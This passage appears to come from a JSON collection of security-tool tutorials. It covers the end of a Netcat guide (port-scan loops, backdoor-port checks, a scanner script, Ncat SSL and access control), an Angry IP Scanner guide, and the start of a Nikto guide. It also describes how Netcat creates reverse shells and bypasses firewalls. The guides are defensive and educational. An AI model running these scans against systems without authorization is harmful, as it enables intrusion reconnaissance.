$port\ndone\n```\n\n**2. Check for common backdoor ports:**\nScan a target for ports often used by malware or backdoors.\n```bash\nfor port in 1234 4444 5555 6666 7777 8888 9999; do\n    echo \"Checking target_host:$port\"\n    nc -z -v -w 1 target_host $port\ndone\n```\n\n#### What to expect\n*   The loops will report `succeeded!` for any open ports, giving you an indication of services or potential unauthorized listeners.\n\n#### Troubleshooting & tips\n*   **False positives:** Just because a port is open doesn't mean it's a \"backdoor.\" It could be a legitimate service on an unusual port. Further investigation (banner grabbing, vulnerability scanning) is required.\n*   **IDS/IPS detection:** Aggressive enumeration can trigger security systems.\n*   **Stealth:** For more stealthy enumeration, you might vary scan timing or use `nmap`'s built-in stealth scanning options.\n\n### Safety / ethics note\n\n**WARNING:** Security testing, including firewall testing and service enumeration, should **only** be conducted on systems and networks for which you have explicit, written authorization. Unauthorized security testing is illegal and unethical. Ensure you understand the scope, limitations, and potential impact of your testing before proceeding.\n\n## Advanced Techniques\n\nBeyond basic client-server and scanning, Netcat can be used for more intricate tasks, often by piping its output to other utilities or incorporating it into scripts.\n\n### Hex Mode\n\n#### What it is / Why it matters\nSometimes, you need to send or receive data in raw hexadecimal format to interact with services at a very low level or debug protocol implementations. While Netcat itself doesn't have a dedicated \"hex mode,\" it can be combined with other tools to achieve this.\n\n#### Step-by-step commands\n\n**1. Send hex data:**\nTo send the ASCII representation of \"GET /\" (hex: `47 45 54 20 2f`) to a web server.\n```bash\necho -e \"\\x47\\x45\\x54\\x20\\x2f\\r\\n\\r\\n\" | nc example.com 80\n```\n*(The `-e` option in `echo` interprets backslash escapes. `\\r\\n\\r\\n` is for HTTP request termination.)*\n\n**2. Receive and display hex:**\nListen on a port, receive data, and pipe it to `hexdump` for hexadecimal display.\n```bash\nnc -l -p 1234 | hexdump -C\n```\n\n#### What to expect\n*   **Sending:** The remote service will receive the exact bytes specified. If connecting to a web server, you might get an HTTP response.\n*   **Receiving:** All incoming data on port 1234 will be displayed in `hexdump`'s canonical format, showing both hex and ASCII representations.\n\n#### Troubleshooting & tips\n*   **`echo -e` compatibility:** Not all `echo` implementations support `-e`. On some systems, `printf` might be a more portable alternative: `printf \"\\x47\\x45\\x54\\x20\\x2f\\r\\n\\r\\n\" | nc example.com 80`.\n*   **`hexdump`:** Ensure `hexdump` is installed (part of `bsdutils` on Debian/Ubuntu).\n*   **Protocol knowledge:** Using hex mode requires a deep understanding of the network protocol you're interacting with.\n\n### Scripting with Netcat\n\n#### What it is / Why it matters\nNetcat's command-line interface makes it highly scriptable. You can embed Netcat commands within shell scripts to automate repetitive tasks, create custom network tools, or integrate network operations into larger workflows.\n\n#### Step-by-step commands\n\n**Example: A basic port scanner script**\n\n```bash\n#!/bin/bash\n# A simple Netcat-based port scanner\n\nif [ -z \"$1\" ] || [ -z \"$2\" ] || [ -z \"$3\" ]; then\n    echo \"Usage: $0 <host> <start_port> <end_port>\"\n    echo \"Example: $0 example.com 1 100\"\n    exit 1\nfi\n\nhost=$1\nstart_port=$2\nend_port=$3\n\necho \"Scanning $host from port $start_port to $end_port...\"\n\nfor ((port=$start_port; port<=$end_port; port++)); do\n    # -z: zero-I/O mode (scan for open ports)\n    # -v: verbose output\n    # -w 1: 1-second timeout for each connection attempt\n    # 2>&1: redirect stderr (where nc prints verbose output) to stdout\n    # grep -q: quietly check for \"succeeded\" in the output\n    if nc -z -v -w 1 $host $port 2>&1 | grep -q \"succeeded\"; then\n        echo \"Port $port is open on $host\"\n    fi\ndone\n\necho \"Scan complete.\"\n```\n*(Save as `simple_scanner.sh`, make executable with `chmod +x simple_scanner.sh`, then run `./simple_scanner.sh example.com 1 100`)*\n\n#### What to expect\nThe script will iterate through the specified port range, printing a message for each port found to be open. It will provide a simple, automated report of open ports.\n\n#### Troubleshooting & tips\n*   **Shell compatibility:** Ensure your script's syntax is compatible with the shell it's executed in (e.g., `bash` vs. `sh`).\n*   **Error handling:** Add more robust error handling (e.g., checking return codes) for production scripts.\n*   **Portability:** Be mindful of Netcat version differences when scripting, especially for `-e`, `-c`, and `-p` options.\n*   **Logging:** Redirect script output to a file for review: `./simple_scanner.sh example.com 1 100 > scan_results.txt`.\n\n### Traffic Analysis\n\n#### What it is / Why it matters\nNetcat can be used as a simple network tap to capture and display traffic, often piped to other tools for filtering or analysis. This is useful for observing raw network interactions, debugging custom protocols, or understanding application behavior.\n\n#### Step-by-step commands\n\n**1. Monitor network traffic (basic capture):**\nListen on a port and save all incoming data to a log file.\n```bash\nnc -l -p 1234 | tee traffic.log\n```\n*(The `tee` command displays output to the screen and saves it to `traffic.log` simultaneously.)*\n\n**2. Analyze HTTP requests (filter for common HTTP methods):**\nListen on a port (e.g., 8080 for a local web server) and display only lines containing HTTP methods.\n```bash\nnc -l -p 8080 | grep -E \"(GET|POST|PUT|DELETE)\"\n```\n*(This is a very simplistic filter; a full HTTP proxy would be more robust.)*\n\n**3. Log connections with timestamps:**\nUse a `while read` loop to process each line and add a timestamp.\n```bash\nnc -l -p 1234 | while read line; do\n    echo \"$(date): $line\" >> connection_log.txt\ndone\n```\n\n#### What to expect\n*   **Traffic Monitoring:** `tee` will continuously display received data and write it to the log file.\n*   **HTTP Analysis:** Only lines matching common HTTP methods will be displayed, filtering out other data.\n*   **Timestamped Logs:** `connection_log.txt` will contain all incoming data, prefixed with the exact time of receipt.\n\n#### Troubleshooting & tips\n*   **`tee` limitations:** If the connection is broken or the Netcat listener stops, `tee` might not flush its buffer immediately.\n*   **Filtering:** `grep` is useful for basic filtering, but for complex protocol analysis, consider `wireshark` or `tcpdump`.\n*   **Performance impact:** Processing traffic through scripts can add latency, especially for high-volume connections.\n*   **Firewall:** Ensure the listening port is allowed.\n\n## Ncat (Nmap's Netcat) Features\n\nNcat is a modern reimplementation of Netcat by the Nmap project, offering enhanced features like SSL/TLS support and access control. It's often preferred for more secure or complex scenarios.\n\n### What it is / Why it matters\nWhile traditional Netcat is powerful, it lacks modern networking features crucial for secure operations, such as encryption and fine-grained access control. Ncat addresses these limitations, providing built-in SSL/TLS, proxying capabilities, and robust access rules, making it a more secure and versatile alternative for many use cases.\n\n### SSL/TLS Support\n\n#### What it is / Why it matters\nTraditional Netcat transmits data in plaintext, which is unsuitable for sensitive communications. Ncat's `--ssl` option allows it to establish encrypted connections, protecting data in transit using SSL/TLS. This is essential for secure client-server communication or tunneling.\n\n#### Step-by-step commands\n\n**1. SSL client (connect to an HTTPS server):**\n```bash\nncat --ssl example.com 443\n```\n\n**2. SSL server (listen with a self-signed certificate):**\n*(First, you'll need a certificate and key. Example: `openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout key.pem -out cert.pem`)*\n```bash\nncat -l --ssl --ssl-cert cert.pem --ssl-key key.pem 443\n```\n\n**3. SSL with certificate verification (client side):**\nVerify the server's certificate against trusted CAs.\n```bash\nncat --ssl --ssl-verify example.com 443\n```\n\n#### What to expect\n*   **SSL Client:** Ncat will attempt to establish an encrypted connection. If successful, you can communicate securely. Output might include SSL handshake details in verbose mode (`-v`).\n*   **SSL Server:** Ncat will listen on the specified port. Clients connecting with `--ssl` will establish an encrypted session.\n*   **Verification:** With `--ssl-verify`, Ncat will validate the server's certificate. If verification fails (e.g., untrusted CA, expired cert), Ncat will refuse to connect or issue a warning.\n\n#### Troubleshooting & tips\n*   **`ncat` vs `nc`:** Remember to use `ncat`, not `nc`, for these commands.\n*   **Certificate issues:** If the SSL server fails to start, ensure `cert.pem` and `key.pem` files exist and are correctly formatted. If the client fails `--ssl-verify`, it could be due to a self-signed certificate (which won't be trusted by default) or an invalid/expired certificate.\n*   **Firewall:** Ensure the firewall allows port 443 (or your custom SSL port).\n*   **OpenSSL:** Ncat typically relies on OpenSSL for its SSL/TLS capabilities. Ensure OpenSSL libraries are present on your system.\n\n### Access Control\n\n#### What it is / Why it matters\nFor server-side operations, controlling who can connect is vital for security. Ncat provides built-in access control lists (ACLs) to allow or deny connections based on source IP address or hostname, enhancing the security of Netcat listeners.\n\n#### Step-by-step commands\n\n**1. Allow specific hosts:**\nOnly allow connections from `192.168.1.100` to port 1234.\n```bash\nncat -l --allow 192.168.1.100 1234\n```\n\n**2. Deny specific hosts:**\nAllow all connections *except* those from `192.168.1.200`.\n```bash\nncat -l --deny 192.168.1.200 1234\n```\n\n**3. Allow an entire subnet:**\nAllow connections from any host within the `192.168.1.0/24` subnet.\n```bash\nncat -l --allow 192.168.1.0/24 1234\n```\n\n#### What to expect\n*   **Allowed connection:** Connections from specified allowed IPs will succeed.\n*   **Denied connection:** Connections from denied IPs will be immediately refused by Ncat, typically with a \"Connection refused\" error on the client side. Ncat itself might log a denial message in verbose mode (`-v`).\n\n#### Troubleshooting & tips\n*   **Order of rules:** In more complex `allow`/`deny` scenarios (e.g., using `--allowfile` or `--denyfile`), the order of rules can matter.\n*   **Hostname vs. IP:** For `--allow` and `--deny`, you can often use hostnames, but `ncat` will resolve them to IPs. Using numeric IPs is generally more reliable and faster.\n*   **Verbose mode (`-v`):** Use `-v` on the Ncat listener to see logs of allowed or denied connections, which is critical for troubleshooting ACLs.\n*   **Firewall interaction:** Ncat's internal ACLs work *in addition* to your system's firewall. If a system firewall already blocks a connection, Ncat won't even see it. Ensure your system firewall permits connections to the Ncat listener port.\n\n## Pro Tips & Best Practices\n\nLeveraging Netcat effectively involves more than just knowing commands; it's about smart usage and integration into your workflow.\n\n### Troubleshooting & tips\n\n*   **Use verbose mode (`-v` flag):** Always include `-v` in your commands. It provides invaluable connection information, error messages, and progress updates, making debugging much easier.\n*   **Set timeouts (`-w <seconds>`):** Prevent Netcat from hanging indefinitely on non-responsive hosts or filtered ports. This is especially crucial for scripting and port scanning.\n*   **Combine with other tools (Piping):** Netcat shines when piped with other command-line utilities like `grep`, `awk`, `sed`, `dd`, `tar`, `gzip`, `tee`, `hexdump`, etc., to filter, format, or process data.\n*   **Test both TCP and UDP:** Many services use both protocols (e.g., DNS). Don't assume. Test explicitly with (`-u`) for UDP.\n*   **Use for quick tests:** Netcat is faster than writing custom network code for simple connectivity, port status, or basic service interaction checks.\n*   **Script repetitive tasks:** Automate common scanning, data transfer, or service interaction patterns using shell scripts (`bash`, `PowerShell`) to save time and ensure consistency.\n*   **Monitor with logging (`tee`):** When acting as a listener or relay, pipe Netcat's output to `tee` to view real-time data while simultaneously saving it to a log file for later analysis.\n*   **Consider Ncat for advanced features:** For SSL/TLS encryption, IPv6 support, access control, and advanced proxying, Ncat from the Nmap project is a superior choice.\n*   **Start locally:** When troubleshooting, always try connecting to `localhost` or `127.0.0.1` first to rule out local machine configuration issues before troubleshooting network paths.\n*   **Keep it simple:** Netcat is powerful but basic. For complex scenarios (high concurrency, advanced protocol parsing, full proxying), specialized tools like `socat`, `Nmap`, `Wireshark`, or dedicated proxies are more appropriate.\n\n## Common Issues & Troubleshooting\n\nEncountering problems with Netcat is common. Here's how to diagnose and fix some typical issues.\n\n### Connection Issues\n\n#### What it is / Why it matters\n\"Connection refused,\" \"No route to host,\" and \"Connection timed out\" are the most frequent errors. They indicate fundamental problems with network reachability, service availability, or firewall interference. Understanding these messages is critical for effective troubleshooting.\n\n#### Step-by-step commands\n\n**1. Check if the port is actually listening on the target:**\nUse `netstat` or `ss` on the target machine to see active listeners.\n```bash\n# On the target machine:\nnetstat -tuln | grep :1234\n# Or (more modern Linux):\nss -tuln | grep :1234\n```\n*(This verifies if a service is actively listening on the specified port.)*\n\n**2. Verify firewall rules on the target:**\nCheck the firewall configuration on the target machine.\n```bash\n# On the target Linux machine:\nsudo iptables -L -n -v\n# Or for UFW:\nsudo ufw status verbose\n# Or for firewalld:\nsudo firewall-cmd --list-all --zone=public\n```\n\n**3. Test local connectivity first:**\nIf connecting to a remote host fails, first try connecting to the same port on `localhost` on the *target* machine.\n```bash\n# On the target machine:\nnc -z -v localhost 1234\n```\n\n#### What to expect\n*   **`netstat`/`ss` output:** If a service is listening, you'll see a line indicating `LISTEN` on the specified port. If not, nothing will be returned.\n*   **Firewall rules:** Output will show allowed/denied rules. Look for anything blocking the port you're trying to use.\n*   **Local connectivity test:** If it succeeds locally but not remotely, the issue is likely a network firewall or routing. If it fails locally, the service isn't running or a local firewall is blocking.\n\n#### Troubleshooting & tips\n*   **Order of operations:** Ensure the server/listener is running *before* the client attempts to connect.\n*   **IP address vs. Hostname:** Try connecting using the target's IP address instead of its hostname to rule out DNS resolution issues.\n*   **Temporary firewall disable:** *In a controlled lab environment*, temporarily disabling a firewall can help isolate if it's the root cause (e.g., `sudo ufw disable` or `sudo systemctl stop firewalld`). Re-enable immediately.\n*   **Network path:** Use `ping`, `traceroute` (or `tracert` on Windows), or `mtr` to check network reachability to the target host.\n\n### Permission Issues\n\n#### What it is / Why it matters\nOn Unix-like systems, binding to privileged ports (those below 1024) requires superuser privileges. Attempting to listen on such a port without `sudo` will result in a \"Permission denied\" error.\n\n#### Step-by-step commands\n\n**1. Binding to privileged ports (< 1024) requires root:**\n```bash\n# This will likely fail with \"Permission denied\" if not root\nnc -l -p 80\n\n# Use sudo to bind to a privileged port\nsudo nc -l -p 80\n```\n\n**2. Use unprivileged ports for testing:**\nFor most testing purposes, use ports above 1024.\n```bash\nnc -l -p 8080\n```\n\n#### What to expect\n*   **Permission denied:** If you try to listen on port 80 (or any port < 1024) without `sudo`, Netcat will immediately exit with an error.\n*   **Successful bind:** With `sudo` or on an unprivileged port, Netcat will start listening.\n\n#### Troubleshooting & tips\n*   **`setcap` (Advanced):** For security-sensitive applications, instead of running the whole `nc` command as `sudo`, you can use `setcap` to grant `nc` specific capabilities, such as `cap_net_bind_service`, allowing it to bind to low ports without full root privileges.\n    ```bash\n    sudo apt install libcap2-bin\n    sudo setcap cap_net_bind_service=+ep /bin/nc.openbsd\n    # Then you can run nc -l -p 80 without sudo\n    ```\n    *(Be cautious with `setcap` as it can introduce security risks if misused.)*\n\n### Version Differences\n\n#### What it is / Why it matters\nThere are several implementations of Netcat (OpenBSD, GNU, traditional, Ncat), and their command-line options can vary significantly. This is a common source of confusion and errors, especially with the `-p` (port) and `-e` (execute) flags.\n\n#### Step-by-step commands\n\n**1. Check your Netcat version and help message:**\n```bash\nnc -h\n# Or:\nnetcat -h\n# Or:\nncat -h\n```\n\n#### What to expect\nThe help message will show the specific options supported by your installed version of Netcat. Look for details on `-l`, `-p`, and `-e`.\n\n#### Troubleshooting & tips\n*   **`-p` flag for listening:**\n    *   **GNU Netcat/Traditional Netcat:** Often requires `-p <port>` explicitly for the listening port (e.g., `nc -l -p 1234`).\n    *   **OpenBSD Netcat:** The listening port is usually the last argument (e.g., `nc -l 1234`). `-p` is often used to specify the *source* port when connecting.\n*   **`-e` flag for execution:**\n    *   **GNU Netcat/Ncat:** Supports `-e` for executing commands.\n    *   **OpenBSD Netcat:** Often lacks `-e` for security reasons. You might need to use named pipes (`mkfifo`) for similar functionality (as shown in the Backdoors section).\n*   **Ncat vs. `nc`:** If a feature isn't available in `nc`, check if `ncat` (if installed) provides it.\n*   **Documentation:** When in doubt, always refer to the specific `man` page for your Netcat version (e.g., `man nc`).\n\n## Security Considerations\n\nNetcat is an incredibly powerful tool that, if misused, can pose severe security risks. Understanding these risks is paramount for responsible and ethical use.\n\n### Safety / ethics note\n\n**WARNING: Netcat can be dangerous if misused.**\n\n*   **Backdoors & Unauthorized Access:** Netcat's ability to create bind and reverse shells (`-e` option) makes it a primary tool for establishing unauthorized access points on compromised systems. This can lead to complete system takeover and data exfiltration.\n*   **Data Exposure:** By default, Netcat transmits all data in plaintext. This means any sensitive information (passwords, private data) sent over a Netcat connection can be intercepted and read by anyone monitoring the network, unless you use Ncat's `--ssl` feature or encrypt data externally.\n*   **Firewall Bypass:** Reverse shells, relays, and port forwarding can be used to tunnel traffic through seemingly allowed ports (like HTTP/S or DNS), effectively bypassing firewall rules designed to restrict outbound connections or internal network access.\n*   **Privilege Escalation:** If an attacker gains initial, low-privileged shell access via Netcat, they can then use that shell to execute commands to escalate privileges, potentially gaining full control over the system.\n*   **Undetected Activity:** Because Netcat is a legitimate network tool, its presence might not immediately trigger alarms, allowing malicious activity to go unnoticed until more sophisticated detection methods are employed.\n*   **System Disruption:** Incorrectly configured Netcat listeners or relays can disrupt legitimate services or cause system instability.\n\n**Always use Netcat responsibly and only on systems you own or have explicit, written permission to test. Unauthorized use can lead to serious legal consequences.**\n\n## Legal Disclaimer\n\n### Safety / ethics note\n\n**WARNING: Netcat should only be used for legitimate and authorized purposes.**\n\n*   **Testing Your Own Networks and Systems:** You are legally and ethically permitted to use Netcat to test the security and functionality of networks and systems that you own and control.\n*   **Authorized Penetration Testing:** Use Netcat only as part of an authorized penetration test or security audit where you have a clear, documented scope of work and explicit, *written permission* from the system owner.\n*   **Educational Purposes:** It is acceptable to use Netcat for educational purposes in isolated, controlled lab environments where no unauthorized access or harm can occur to third-party systems.\n*   **Legitimate Network Troubleshooting and Administration:** Netcat is a valid tool for diagnosing network issues, verifying connectivity, and performing other routine network administration tasks.\n\n**Creating backdoors, attempting unauthorized access, performing unauthorized port scans, or using Netcat for any malicious or non-consensual purpose is illegal, unethical, and can result in severe legal penalties, including fines and imprisonment. Always obtain proper authorization before testing network security or interacting with systems you do not own.**"
      }
    ]
  },
  {
    "name": "Angry IP Scanner",
    "description": "Fast and friendly network scanner.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "ip scanning",
      "port scanning",
      "gui"
    ],
    "color": "#e54ba0",
    "articles": [
      {
        "title": "Angry IP Scanner — Complete Guide",
        "content": "# 🛠️ Angry IP Scanner — Complete Guide\n\n> **Purpose:** A concise, practical, and exportable Markdown reference for Angry IP Scanner (ipscan). Each numbered section follows the requested structure: **What it is / Why it matters**, **Step-by-step commands**, **What to expect**, **Troubleshooting & tips**, and **Safety / ethics note**.\n\n---\n\n## 1. What is Angry IP Scanner?\n\n**What it is / Why it matters**\n\nAngry IP Scanner (ipscan) is a fast, cross-platform IP address and port scanner. It quickly detects live hosts and can gather additional information (hostname, MAC, ports, vendor) using fetchers and plugins. It's useful for network discovery, inventory, and quick security checks where a GUI-based, easy-to-use tool is preferred.\n\n**Step-by-step commands**\n\n> Angry IP Scanner is primarily GUI-based. Use the JAR for cross-platform CLI-style usage.\n\n```bash\n# Run the JAR (requires Java)\njava -jar ipscan-3.x.x.jar\n```\n\n**What to expect**\n\n* Fast host discovery using ICMP/TCP pings.\n* Tabular results showing IP, ping, hostname, ports, MAC, vendor, TTL.\n* Export options (CSV, TXT, XML, IP:Port list).\n\n**Troubleshooting & tips**\n\n* If Java is missing, install Java 8+ and re-run.\n* For large networks, increase timeout and reduce thread count to avoid false negatives.\n\n**Safety / ethics note**\n\nOnly scan networks you own or are authorized to test. Unauthorized scanning can be illegal and trigger security alerts.\n\n---\n\n## 2. Installation & Setup\n\n**What it is / Why it matters**\n\nInstalling the correct package for your OS ensures the scanner runs smoothly and integrates with system features (shortcuts, updates). The portable version is useful for quick use without installation.\n\n**Step-by-step commands**\n\n### Windows\n\n```text\n# Download from official site:\n# https://angryip.org/download/\n# Portable: ipscan-win64-3.x.x.exe (run directly)\n# Installer: ipscan-win64-3.x.x-setup.exe (run installer)\n```\n\n### Ubuntu/Debian (DEB)\n\n```bash\nwget https://github.com/angryip/ipscan/releases/download/3.x.x/ipscan_3.x.x_amd64.deb\nsudo dpkg -i ipscan_3.x.x_amd64.deb\nsudo apt -f install   # fix deps if needed\n```\n\n### RPM-based systems\n\n```bash\nwget https://github.com/angryip/ipscan/releases/download/3.x.x/ipscan-3.x.x-1.x86_64.rpm\nsudo rpm -i ipscan-3.x.x-1.x86_64.rpm\n```\n\n### Generic JAR (any OS; requires Java)\n\n```bash\nwget https://github.com/angryip/ipscan/releases/download/3.x.x/ipscan-3.x.x.jar\njava -jar ipscan-3.x.x.jar\n```\n\n**What to expect**\n\n* Desktop launcher on installer-based installs.\n* Portable binary runs without system changes.\n* JAR works anywhere with Java installed.\n\n**Troubleshooting & tips**\n\n* Use `java -version` to confirm Java.\n* On Linux, `dpkg -i` may require `sudo apt -f install` to install missing deps.\n* If GUI doesn't open on Linux, ensure Java GUI libs are present (headless Java often lacks GUI support).\n\n**Safety / ethics note**\n\nPrefer official downloads to avoid tampered binaries.\n\n---\n\n## 3. Basic Usage & Interface\n\n**What it is / Why it matters**\n\nUnderstanding the UI allows you to configure scans safely and interpret results accurately.\n\n**Step-by-step commands**\n\n```text\n# Launch on each OS:\n# Windows: double-click ipscan.exe or start from Start Menu\n# Linux: ipscan (or java -jar ipscan.jar)\n# macOS: Launch from Applications or run the JAR\n```\n\n**What to expect**\n\n* Input field for IP range\n* Buttons: Start / Stop\n* Columns for each fetcher (IP, Ping, Hostname, Ports, MAC, Vendor)\n* Status bar with progress, ips/sec, elapsed time\n\n**Troubleshooting & tips**\n\n* If columns are missing, enable fetchers in Tools → Preferences → Fetchers.\n* Use View options to hide dead hosts to reduce clutter.\n\n**Safety / ethics note**\n\nBe mindful when running scans on shared or production networks—limit threads and run off-peak where possible.\n\n---\n\n## 4. IP Range Configuration\n\n**What it is / Why it matters**\n\nSpecifying ranges correctly ensures you scan intended targets and avoid accidental broad scans.\n\n**Step-by-step commands**\n\nExamples of valid input for the IP range field:\n\n```text\n# Single IP\n192.168.1.100\n\n# Range with dash\n192.168.1.1-192.168.1.254\n\n# CIDR\n192.168.1.0/24\n\n# Subnet mask\n192.168.1.0/255.255.255.0\n\n# Multiple ranges\n192.168.1.0/24,10.0.0.0/24\n\n# Hostname\nexample.com\n```\n\n**What to expect**\n\n* Scans limited to specified ranges.\n* Auto-detection options (Tools → Fetch from current IP) to help choose local subnet.\n\n**Troubleshooting & tips**\n\n* For very large CIDRs (e.g., /8), split the work into smaller ranges.\n* Avoid accidental `0.0.0.0/0`-style scans.\n\n**Safety / ethics note**\n\nDouble-check entered ranges before hitting Start to avoid scanning unintended networks.\n\n---\n\n## 5. Scanning Options & Configuration\n\n**What it is / Why it matters**\n\nFine-tuning ping, ports, and performance options helps balance speed against accuracy and network impact.\n\n**Step-by-step commands**\n\nConfigure these in the GUI (Tools → Preferences) or adjust CLI flags when using JAR.\n\n```text\n# Example port list (enter in Ports field):\n21,22,23,25,53,80,110,143,443,993,995\n\n# Port ranges:\n1-1000\n20-25,80,443\n```\n\nPerformance controls:\n\n* Thread count: set number of concurrent threads\n* Timeout: connection timeout (ms)\n* Delay: delay between requests\n* Retry count: number of retries\n\n**What to expect**\n\n* Higher threads = faster scans, greater network load\n* Larger timeouts = slower but fewer false negatives\n\n**Troubleshooting & tips**\n\n* If results are incomplete, increase timeout and retries.\n* If network devices drop ICMP, use TCP ping/fallback options.\n\n**Safety / ethics note**\n\nAvoid overly aggressive threading/timeouts on production networks; coordinate with network teams.\n\n---\n\n## 6. Fetchers & Plugins\n\n**What it is / Why it matters**\n\nFetchers extend gathered data for each host (MAC, NetBIOS, TTL). Plugins allow custom data collection.\n\n**Step-by-step commands**\n\n```text\n# Configure fetchers:\nTools → Preferences → Fetchers\n# Enable/disable, reorder columns, configure options.\n\n# Add plugin:\nTools → Plugins → Add new plugin (follow plugin docs)\n```\n\n**Common built-in fetchers**\n\n* IP, Ping, Hostname, Ports, NetBIOS Info, MAC Address, MAC Vendor, TTL, Comments\n\n**What to expect**\n\n* Each enabled fetcher adds a column to results.\n* Some fetchers (NetBIOS, MAC) may require additional privileges on some OSes.\n\n**Troubleshooting & tips**\n\n* If MAC addresses are blank, the host may be on a different L2 segment; MAC discovery requires ARP responses.\n* NetBIOS fetcher works best on Windows LANs.\n\n**Safety / ethics note**\n\nFetchers can reveal sensitive host metadata — keep exports secure.\n\n---\n\n## 7. Scanning Process & Results\n\n**What it is / Why it matters**\n\nUnderstanding the scan lifecycle and result colors helps interpret findings quickly.\n\n**Step-by-step commands**\n\n1. Enter IP range\n2. Set ports (optional)\n3. Choose fetchers\n4. Click **Start** or press Enter\n5. Monitor progress and stop when needed\n\n**What to expect**\n\n* Red rows: alive hosts\n* White rows: dead hosts\n* Blue rows: hosts with open ports\n* Green rows: hosts with additional info\n\n**Troubleshooting & tips**\n\n* If scan hangs, lower thread count or stop and restart.\n* Use search and sort to find interesting hosts quickly.\n\n**Safety / ethics note**\n\nReal-time scans may trigger IDS/IPS alerts. Notify security teams if running broad scans.\n\n---\n\n## 8. Result Filtering & Exporting\n\n**What it is / Why it matters**\n\nFiltering and exporting lets you keep records, share findings, or import into other tools.\n\n**Step-by-step commands**\n\n```text\n# Export via GUI:\nFile → Export → Choose format (CSV/TXT/XML/IP:Port)\n\n# Command-line export example:\njava -jar ipscan.jar -c -f:range 192.168.1.0/24 -f:csv -o results.csv\n```\n\n**What to expect**\n\n* CSV is easiest to analyze in spreadsheets.\n* IP:Port format is useful for feeding other scanners or tools.\n\n**Troubleshooting & tips**\n\n* If columns are missing in export, ensure fetchers were enabled before scanning.\n* Use consistent filename conventions with timestamps for traceability.\n\n**Safety / ethics note**\n\nTreat export files as sensitive if they contain internal IPs, open ports, or MAC addresses.\n\n---\n\n## 9. Command Line Usage & Automation\n\n**What it is / Why it matters**\n\nCommand-line mode enables automation, scheduled scans, and integration into scripts.\n\n**Step-by-step commands**\n\n```bash\n# Basic CLI scan (quiet, console):\njava -jar ipscan.jar -c -f:range 192.168.1.0/24\n\n# Export to file (CSV):\njava -jar ipscan.jar -c -f:range 192.168.1.0/24 -f:csv -o results.csv\n\n# Quiet mode:\njava -jar ipscan.jar -c -q -f:range 192.168.1.0/24\n```\n\n**Batch scanning script (example)**\n\n```bash\n#!/bin/bash\nnetworks=(\"192.168.1.0/24\" \"192.168.2.0/24\" \"10.0.0.0/24\")\ntimestamp=$(date +%Y%m%d_%H%M%S)\n\nfor network in \"${networks[@]}\"; do\n  echo \"Scanning $network...\"\n  output_file=\"scan_${network//\\//_}_${timestamp}.csv\"\n  java -jar ipscan.jar -c -q -f:range $network -f:csv -o \"$output_file\"\n  echo \"Results saved to: $output_file\"\ndone\n```\n\n**What to expect**\n\n* Non-interactive runs suitable for cron jobs.\n* Exits with saved file for further processing.\n\n**Troubleshooting & tips**\n\n* Include error handling in scripts for network failures.\n* Use smaller ranges to avoid timeouts on long-running jobs.\n\n**Safety / ethics note**\n\nAutomated scans increase risk of accidental wide scans — validate scripts thoroughly.\n\n---\n\n## 10. Advanced Features\n\n**What it is / Why it matters**\n\nCustom openers, favorites, and plugins increase productivity and integration with workflow tools.\n\n**Step-by-step commands**\n\n```text\n# Configure Custom Openers:\nTools → Preferences → Openers → Add command (e.g., ssh %ip%)\n\n# Favorites:\nAdd current range → Save to favorites for quick reuse\n```\n\n**What to expect**\n\n* Double-click a result to open in configured tool (browser, SSH client, etc.).\n* Favorites show up in the dropdown list.\n\n**Troubleshooting & tips**\n\n* Use placeholder tokens such as `%ip%` or `%ip%:%port%` depending on opener support.\n\n**Safety / ethics note**\n\nCustom openers may auto-launch network connections — ensure commands are safe and vetted.\n\n---\n\n## 11. Statistics & Monitoring\n\n**What it is / Why it matters**\n\nLive statistics help you judge scan progress and performance impact.\n\n**Step-by-step commands**\n\n```text\n# Monitor in GUI: status bar shows ips/sec, progress, elapsed time\n# For logging, export results periodically in automation scripts\n```\n\n**What to expect**\n\n* Real-time ips/sec metric\n* Thread utilization visible in preferences/status\n\n**Troubleshooting & tips**\n\n* If ips/sec is low on expected local networks, verify network path and thread settings.\n\n**Safety / ethics note**\n\nMonitoring helps avoid unintended overloads—stop scan if rates impact production.\n\n---\n\n## 12. Security Applications\n\n**What it is / Why it matters**\n\nAngry IP Scanner is useful for discovery, vulnerability pre-checks, and asset inventory.\n\n**Step-by-step commands**\n\n```text\n# Example: quick security-relevant port scan\nPorts: 22,23,80,443,3389\nFetchers: IP, Ping, Hostname, Ports, MAC Vendor\n```\n\n**What to expect**\n\n* Identification of hosts with exposed management ports\n* Data to cross-check with asset inventory\n\n**Troubleshooting & tips**\n\n* Follow up flagged hosts with targeted tools (e.g., nmap) for service/version detection.\n\n**Safety / ethics note**\n\nDo not u\n"
      }
    ]
  },
  {
    "name": "Nikto",
    "description": "A web server scanner which performs comprehensive tests.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "web server",
      "vulnerability scanning"
    ],
    "color": "#75e54b",
    "articles": [
      {
        "title": "🔍 Nikto — Web Server Scanner Complete Guide",
        "content": "# 🔍 Nikto — Web Server Scanner Complete Guide\n\nThis guide is organized into structured, numbered sections. Each section contains:\n- **What it is / Why it matters** — short conceptual explanation.  \n- **Step-by-step commands** — runnable commands with safe defaults.  \n- **What to expect** — typical output or behavior.  \n- **Troubleshooting & tips** — common problems and fixes.  \n- **Safety / ethics note** — when applicable.\n\n---\n\n## 1. What is Nikto?\n\n**What it is / Why it matters**  \nNikto is an open-source web server scanner written in Perl that performs comprehensive checks against web servers: finding potentially dangerous files/programs, outdated server versions, misconfigurations, and common vulnerabilities. It's a fast reconnaissance tool for initial web security assessments.\n\n**Step-by-step commands**  \n```bash\nShow version / help\nnikto -Version\nnikto -H\n```\n\n**What to expect**  \nNikto prints scan progress, discovered issues, and a summary. It reports findings such as dangerous files, server banners, and configuration problems.\n\n**Troubleshooting & tips**  \nIf `nikto` is not found, verify installation path or use `perl nikto.pl` from the program directory.\n\n**Safety / ethics note**  \nOnly scan servers you own or have explicit permission to test. Nikto can be noisy and may affect server performance.\n\n---\n\n## 2. Installation & Setup\n\n**What it is / Why it matters**  \nInstall Nikto via package manager, from source, or use Docker for isolated runs.\n\n**Step-by-step commands**\n\n### Debian / Ubuntu\n```bash\nsudo apt update\nsudo apt install nikto -y\nnikto -Version\n```\n\n### CentOS / RHEL / Fedora\n```bash\nsudo yum install nikto -y\nor\nsudo dnf install nikto -y\nnikto -Version\n```\n\n### From source (manual)\n```bash\ngit clone https://github.com/sullo/nikto.git\ncd nikto/program\nchmod +x nikto.pl\nRun with 